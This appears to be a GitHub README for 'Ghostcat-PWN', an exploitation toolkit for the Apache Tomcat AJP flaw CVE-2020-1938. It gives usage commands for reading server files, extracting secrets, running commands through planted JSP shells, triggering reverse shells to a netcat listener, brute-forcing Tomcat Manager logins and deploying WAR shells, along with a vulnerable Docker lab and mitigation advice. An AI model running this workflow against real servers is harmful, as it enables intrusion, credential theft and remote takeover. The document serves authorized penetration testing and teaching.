# Ghostcat-PWN

### Apache Tomcat Ghostcat (CVE-2020-1938) Exploitation Framework

> A powerful penetration testing framework for assessing and exploiting the Apache Tomcat AJP vulnerability (**CVE-2020-1938**).

Ghostcat-PWN combines reconnaissance, vulnerability validation, file disclosure, credential extraction, command execution, reverse shells, brute-forcing, automated loot collection, and deployment utilities into a single command-line toolkit.

---

## Table of Contents

* [Overview](#overview)
* [About Ghostcat (CVE-2020-1938)](#about-ghostcat-cve-2020-1938)
* [Features](#features)
* [Installation](#installation)
* [Quick Start](#quick-start)
* [Usage](#usage)

  * [Global Options](#global-options)
  * [check — Vulnerability Check](#check--vulnerability-check)
  * [scan — Port Scan](#scan--port-scan)
  * [read — File Disclosure](#read--file-disclosure)
  * [exec — Command Execution](#exec--command-execution)
  * [revshell — Reverse Shell Trigger](#revshell--reverse-shell-trigger)
  * [snatch — Automated Loot Collection](#snatch--automated-loot-collection)
  * [upload — File Upload](#upload--file-upload)
  * [rce — One-Shot Upload + Execute](#rce--one-shot-upload--execute)
  * [brute — Credential Brute Force](#brute--credential-brute-force)
  * [deploy — WAR Deployment](#deploy--war-deployment)
* [Theory & Attack Chain](#theory--attack-chain)
* [Lab Setup (Docker)](#lab-setup-docker)
* [Mitigation](#mitigation)
* [Disclaimer](#disclaimer)
* [Author & Credits](#author--credits)

---

# Overview

**Ghostcat-PWN** is a full-featured security assessment framework built around the Apache Tomcat Ghostcat vulnerability (**CVE-2020-1938**).

The framework streamlines the entire attack workflow, from discovering exposed AJP services to extracting sensitive files and interacting with already-deployed JSP components for authorized security testing.

---

# About Ghostcat (CVE-2020-1938)

**CVE-2020-1938**, commonly known as **Ghostcat**, is a vulnerability affecting Apache Tomcat's **AJP (Apache JServ Protocol) Connector**.

Improper handling of AJP request attributes can allow an attacker to:

* Read arbitrary files within a deployed web application
* Access sensitive configuration files
* Retrieve source code and credentials
* Under specific deployment conditions, force Tomcat to process files as JSPs

### Affected Versions

| Tomcat Version | Vulnerable       |
| -------------- | ---------------- |
| 6.x            | Yes              |
| 7.x            | Prior to 7.0.100 |
| 8.x            | Prior to 8.5.51  |
| 9.x            | Prior to 9.0.31  |

Ghostcat-PWN automates vulnerability validation and post-disclosure analysis for authorized testing environments.

---

# Features

| Feature                   | Description                                           |
| ------------------------- | ----------------------------------------------------- |
| Vulnerability Check       | Quickly determine whether a target appears vulnerable |
| Port Scan                 | Verify whether AJP (8009) is exposed                  |
| File Disclosure           | Read files inside the web application context         |
| Secret Extraction         | Identify passwords, JDBC URLs, API keys, and tokens   |
| Command Execution         | Interact with an existing JSP command shell           |
| Reverse Shell Trigger     | Trigger a pre-positioned reverse shell JSP            |
| Automated Loot Collection | Download common sensitive files automatically         |
| File Upload               | Upload content via WebDAV or Tomcat Manager           |
| One-Shot RCE Workflow     | Upload and immediately interact with a JSP shell      |
| Credential Brute Force    | Test Tomcat Manager credentials                       |
| WAR Deployment            | Deploy WAR files through Tomcat Manager               |
| SOCKS5 Proxy Support      | Route traffic through a proxy                         |
| Verbose Debugging         | Display raw AJP communication                         |
| Modular Architecture      | Easily extend functionality                           |

---

# Installation

Clone the repository:

```bash
git clone https://github.com/j0ck3r/ghostcat-pwn.git
cd ghostcat-pwn
```

Install dependencies:

```bash
pip install -r requirements.txt
```

Or install proxy support manually:

```bash
pip install PySocks
```

### Requirements

* Python 3.6+
* PySocks (optional)

Make the script executable (optional):

```bash
chmod +x ghostcat-pwn.py
```

---

# Quick Start

### 1. Check a Target

```bash
python3 ghostcat-pwn.py check example.com 8009
```

### 2. Scan the AJP Port

```bash
python3 ghostcat-pwn.py scan example.com 8009
```

### 3. Read a Sensitive File

```bash
python3 ghostcat-pwn.py read example.com 8009 /WEB-INF/web.xml
```

### 4. Execute a Command

Requires a JSP shell (e.g., `cmd2.jsp`) already present on the target.

```bash
python3 ghostcat-pwn.py exec example.com 8009 /cmd2.jsp "id"
```

### 5. Collect Common Sensitive Files

```bash
python3 ghostcat-pwn.py snatch example.com 8009
```

### 6. One-Shot Upload + Execute Workflow

```bash
python3 ghostcat-pwn.py rce example.com 8009 8080 "whoami"
```

---

# Usage

## Global Options

| Flag                         | Description                                   |
| ---------------------------- | --------------------------------------------- |
| `--proxy socks5://host:port` | Route traffic through a SOCKS5 proxy          |
| `--verbose`                  | Display debug information and raw AJP packets |

---

## check — Vulnerability Check

Attempt to read a file (default: `/WEB-INF/web.xml`) to determine whether the target appears vulnerable.

### Syntax

```bash
python3 ghostcat-pwn.py check <host> [port]
```

### Options

| Option            | Description           |
| ----------------- | --------------------- |
| `--file <path>`   | File used for testing |
| `--timeout <sec>` | Socket timeout        |
| `--json`          | JSON formatted output |

### Example

```bash
python3 ghostcat-pwn.py check 192.168.1.10 8009 --json
```

---

## scan — Port Scan

Check whether the AJP service is reachable.

### Syntax

```bash
python3 ghostcat-pwn.py scan <host> [port]
```

### Example

```bash
python3 ghostcat-pwn.py scan 10.10.10.5 --timeout 2
```

---

## read — File Disclosure

Read files located inside the web application.

### Syntax

```bash
python3 ghostcat-pwn.py read <host> <ajp_port> <file_path>
```

### Options

| Option           | Description                   |
| ---------------- | ----------------------------- |
| `-o`, `--output` | Save contents to file         |
| `--extract`      | Extract secrets automatically |
| `--timeout`      | Socket timeout                |

### Examples

```bash
python3 ghostcat-pwn.py read target.com 8009 /WEB-INF/classes/jdbc.properties --extract
```

```bash
python3 ghostcat-pwn.py read target.com 8009 /WEB-INF/web.xml -o config.xml
```

---

## exec — Command Execution

Interact with a JSP shell that accepts commands through:

```java
request.getAttribute("cmd")
```

### Syntax

```bash
python3 ghostcat-pwn.py exec <host> <ajp_port> <jsp_path> <command>
```

### Example

```bash
python3 ghostcat-pwn.py exec target.com 8009 /cmd2.jsp "cat /etc/passwd"
```

> The JSP must already exist on the target and must support command execution through request attributes.

---

## revshell — Reverse Shell Trigger

Trigger a previously deployed reverse-shell JSP.

### Syntax

```bash
python3 ghostcat-pwn.py revshell <host> <ajp_port> <jsp_path>
```

### Example

```bash
python3 ghostcat-pwn.py revshell target.com 8009 /rev.jsp
```

Ensure a listener is running before triggering:

```bash
nc -lvnp 4444
```

---

## snatch — Automated Loot Collection

Read multiple sensitive files and store them locally.

### Syntax

```bash
python3 ghostcat-pwn.py snatch <host> <ajp_port>
```

### Options

| Option         | Description            |
| -------------- | ---------------------- |
| `--wordlist`   | Custom file path list  |
| `--output-dir` | Loot storage directory |
| `--timeout`    | Socket timeout         |

### Example

```bash
python3 ghostcat-pwn.py snatch 10.10.10.5 8009 --wordlist mypaths.txt
```

---

## upload — File Upload

Upload content using:

* HTTP PUT (WebDAV)
* Tomcat Manager WAR deployment

### Syntax

```bash
python3 ghostcat-pwn.py upload <host> <http_port> <local_file> <remote_path>
```

### Options

| Option        | Description             |                  |
| ------------- | ----------------------- | ---------------- |
| `--method put | war`                    | Upload mechanism |
| `--username`  | Authentication username |                  |
| `--password`  | Authentication password |                  |
| `--ssl`       | Use HTTPS               |                  |
| `--timeout`   | Socket timeout          |                  |

### Examples

#### WebDAV Upload

```bash
python3 ghostcat-pwn.py upload target.com 8080 cmd2.jsp /webdav/cmd2.jsp
```

#### WAR Deployment

```bash
python3 ghostcat-pwn.py upload target.com 8080 shell.war /manager/text/deploy \
--method war \
--username tomcat \
--password s3cret
```

---

## rce — One-Shot Upload + Execute

Upload a JSP command shell and immediately interact with it.

### Syntax

```bash
python3 ghostcat-pwn.py rce <host> <ajp_port> <http_port> <command>
```

### Example

```bash
python3 ghostcat-pwn.py rce target.com 8009 8080 "id"
```

> Requires writable WebDAV support (`readonly=false`).

---

## brute — Credential Brute Force

Test Tomcat Manager credentials against:

```text
/manager/text/list
```

### Syntax

```bash
python3 ghostcat-pwn.py brute <host> <http_port>
```

### Options

| Option       | Description               |
| ------------ | ------------------------- |
| `--userlist` | Username wordlist         |
| `--passlist` | Password wordlist         |
| `--timeout`  | Request timeout           |
| `--quiet`    | Suppress invalid attempts |

### Example

```bash
python3 ghostcat-pwn.py brute target.com 8080 \
--userlist users.txt \
--passlist passwords.txt
```

---

## deploy — WAR Deployment

Deploy a WAR archive using valid Tomcat Manager credentials.

### Syntax

```bash
python3 ghostcat-pwn.py deploy <host> <http_port> <war_file> \
--username <user> \
--password <pass>
```

### Example

```bash
python3 ghostcat-pwn.py deploy target.com 8080 my_shell.war \
--username admin \
--password admin
```

---

# Theory & Attack Chain

Ghostcat abuses how Tomcat processes specific AJP attributes within a `FORWARD_REQUEST`.

Key attributes include:

```text
javax.servlet.include.request_uri
javax.servlet.include.servlet_path
```

An attacker can manipulate these values to cause Tomcat components such as the `DefaultServlet` or `JspServlet` to process arbitrary files inside the application.

Typical assessment workflow:

1. Discover exposed AJP services
2. Retrieve sensitive application files
3. Identify credentials and secrets
4. Access additional services
5. Deploy or interact with server-side components
6. Conduct post-exploitation analysis

Ghostcat-PWN automates much of this workflow for authorized testing scenarios.

---

# Lab Setup (Docker)

Build a vulnerable Tomcat environment for local testing.

```bash
cat > Dockerfile <<EOF
FROM tomcat:8.0-jre8

RUN mkdir -p /usr/local/tomcat/webapps/ROOT/WEB-INF
RUN echo '<web-app>' > /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
RUN echo '  <display-name>Ghostcat Demo</display-name>' >> /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
RUN echo '  <!-- DB_PASSWORD=Sup3rS3cr3t! -->' >> /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml
RUN echo '</web-app>' >> /usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml

RUN mkdir -p /usr/local/tomcat/conf/Catalina/localhost
RUN echo '<Context path="/" docBase="ROOT" privileged="true" antiResourceLocking="false" allowLinking="true">' \
> /usr/local/tomcat/conf/Catalina/localhost/ROOT.xml

RUN echo '  <Resources allowLinking="true" />' >> \
/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml

RUN echo '</Context>' >> \
/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml

RUN sed -i '/<servlet-name>webdav<\/servlet-name>/,/<\/servlet>/ \
s/<param-value>true<\/param-value>/<param-value>false<\/param-value>/' \
/usr/local/tomcat/conf/web.xml
EOF
```

Build and run:

```bash
docker build -t ghostcat-lab .
docker run -d -p 8080:8080 -p 8009:8009 --name ghostcat-app ghostcat-lab
```

You can now test the framework against:

```text
localhost:8009
```

---

# Mitigation

### Upgrade Tomcat

Upgrade to one of the following versions:

| Branch | Fixed Version |
| ------ | ------------- |
| 7.x    | 7.0.100+      |
| 8.x    | 8.5.51+       |
| 9.x    | 9.0.31+       |

### Disable AJP

If AJP is not required:

```xml
<Connector port="8009" protocol="AJP/1.3" />
```

Remove or comment out the connector.

### Restrict Access

Bind AJP to localhost only:

```xml
address="127.0.0.1"
```

### Enable Secrets

Require authentication between Tomcat and the reverse proxy:

```xml
secretRequired="true"
secret="StrongRandomSecret"
```

---

# Disclaimer

This project is intended **solely for authorized security testing, research, and educational purposes**.

Users must obtain explicit authorization before testing any system or network that they do not own or manage.

The author assumes **no liability** for misuse, damage, or legal consequences resulting from the use of this software.

---

# Author & Credits

### Author

**Deepanshu Khanna**
GitHub: https://github.com/deep1792

### Credits

* Chaitin Tech — Original Ghostcat vulnerability discovery
* TryHackMe — Inspiration from the *Tomghost* room

---

## Support the Project

If you find Ghostcat-PWN useful:

Star the repository

Report bugs and issues

Submit improvements and pull requests

Contributions, suggestions, and feature requests are always welcome.
